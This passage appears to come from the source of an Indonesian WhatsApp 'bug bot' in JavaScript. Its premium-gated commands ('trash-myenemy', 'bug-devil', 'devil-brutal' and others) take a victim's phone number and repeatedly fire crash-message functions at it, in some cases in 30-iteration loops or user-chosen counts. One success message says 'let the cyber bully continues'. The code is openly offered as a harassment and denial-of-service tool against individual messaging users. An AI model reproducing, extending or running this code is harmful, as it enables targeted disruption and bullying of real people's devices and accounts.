ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
case 'trash-myenemy': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 1; j++) {
await blackening(target, force2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await listxeonfck(target, oneclickxeon)
await locationxeony(target, force)
ngeloc(target, force)
await locationxeony(target, force)
await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
 await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
 await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
 await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
 await blackening(target, force2)
 await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await locationxeony(target, force)
ngeloc(target, force)
await locationxeony(target, force)
await blackening(target, force2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await anggazyyiphone(target)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
case 'devil-creds': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 1; j++) {
await blackening(target, force2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await listxeonfck(target, oneclickxeon)
await locationxeony(target, force)
ngeloc(target, force)
await locationxeony(target, force)
await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
 await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
 await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
 await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
 await blackening(target, force2)
 await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await locationxeony(target, force)
ngeloc(target, force)
await locationxeony(target, force)
await blackening(target, force2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await anggazyyiphone(target)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
case 'temp-bug': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 1; j++) {
await blackening(target, force2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await listxeonfck(target, oneclickxeon)
await locationxeony(target, force)
ngeloc(target, force)
await locationxeony(target, force)
await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
 await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
 await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
 await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
 await blackening(target, force2)
 await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await locationxeony(target, force)
ngeloc(target, force)
await locationxeony(target, force)
await blackening(target, force2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await anggazyyiphone(target)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
case 'wa-bisnismeta': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 1; j++) {
await blackening(target, force2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await listxeonfck(target, oneclickxeon)
await locationxeony(target, force)
ngeloc(target, force)
await locationxeony(target, force)
await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
 await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
 await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
 await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
 await blackening(target, force2)
 await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await locationxeony(target, force)
ngeloc(target, force)
await locationxeony(target, force)
await blackening(target, force2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await anggazyyiphone(target)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
case 'bugofc': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 1; j++) {
await blackening(target, force2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await listxeonfck(target, oneclickxeon)
await locationxeony(target, force)
ngeloc(target, force)
await locationxeony(target, force)
await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
 await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
 await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
 await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
 await blackening(target, force2)
 await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await locationxeony(target, force)
ngeloc(target, force)
await locationxeony(target, force)
await blackening(target, force2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await anggazyyiphone(target)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
  
case "kirimscript": {
if (!isOwner) return reply(msg.owner)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
let a = getTime().split("T")[1].split("+")[0]
var name = `DevilPrivate`
const ls = (await execSync("ls"))
.toString()
.split("\n")
.filter(
(pe) =>
pe != "node_modules" &&
pe != "session" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != ""
)
const anu = await execSync(`zip -r ${name}.zip ${ls.join(" ")}`)
await anggazyy.sendMessage(target, {document: await fs.readFileSync(`./${name}.zip`), fileName: `${name}.zip`, 
mimetype: "application/zip"}, {quoted: m})
await execSync(`rm -rf ${name}.zip`)
if (m.chat !== m.sender) return reply("Scriptbot Berhasil Dikirim Ke Chat Pribadi")
}
break
case 'bug-devil': case 'bug-devil2': case 'bug-devil3': case 'devil-iphone': case 'bug-alldev':
if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Example:\n ${prefix + command} 62xxxx|5`)
victim = text.split("|")[0]
amount = text.split("|")[1]
target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
for (let i = 0; i < amount; i++) {
bughomebutton(target)
sendListMessage(target)
sleep(500)
sendLiveLocationMessage(target)
sleep(500)
sendSystemCrashMessage(target)
sleep(500)
iponcrash(target)
sleep(500)
bughomebutton(target)
sleep(500)
sendListMessage(target)
sleep(500)
sendLiveLocationMessage(target)
sleep(500)
sendSystemCrashMessage(target)
sleep(500)
await anggazyyiphone(target)
sleep(500)
await anggazyyiphone(target)
sleep(500)
await listxeonfck(target, oneclickxeon)
sleep(500)
await locationxeony(target, force)
sleep(500)
await xeonkillpic(target, oneclickxeon)
sleep(500)
await locationxeony(target, force)
sleep(500)
iponcrash(Pe)
sleep(500)
bughomebutton(Pe)
}
reply(`</> Sukses mengirim bug *${command}* Dengan jumlah *${amount}*`)
break
case 'good-night': 
if (!isPremium) return reply(msg.anggazyyprem)
jumlah = 20
sendRepeatedMessages2(from, jumlah)
await sleep(2000)
reply(`*✅ target down using ${command}*.\n\n let the cyber bully continues 👤💥`)
break
case 'bug-devilofc': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 1; j++) {
await blackening(target, force2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await listxeonfck(target, oneclickxeon)
await locationxeony(target, force)
ngeloc(target, force)
await locationxeony(target, force)
await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
 await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
 await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
 await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
 await blackening(target, force2)
 await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
await locationxeony(target, force)
await listxeonfck(target, oneclickxeon)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await locationxeony(target, force)
ngeloc(target, force)
await locationxeony(target, force)
await blackening(target, force2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await blackening(target, force2)
ngeloc(target, force)
await anggazyyiphone(target)
await pirgam(target, angggazyyvault)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
case '〽️': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
case '🎁': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
ngeloc(target, force)
}
await reply(`✅ Donee, Okee Desuuu ~`)
}
break
case 'devil-brutal':
if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Example:\n ${prefix + command} 62xxxx|5`)
victim = text.split("|")[0]
amount = text.split("|")[1]
target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
for (let i = 0; i < amount; i++) {
sendSystemCrashMessage(Pe)
bakdok(target, force)
ngeloc(target, force)
bughomebutton(target)
iponcrash(target)
sleep(200)
sendSystemCrashMessage(target)
pirgam(target, bugquoteddvc)
bughomebutton(target)
sendLiveLocationMessage(target)
sleep(2000)
}
reply(`</> Successfully mengirim bug *${command}* Dengan jumlah *${amount}*`)
break
case '⚔️': {

if (!isPremium) return reply(msg.anggazyyprem)
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(msg.wait)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
await penghitaman(target, anggazyycrash2)
ngeloc(target, force)
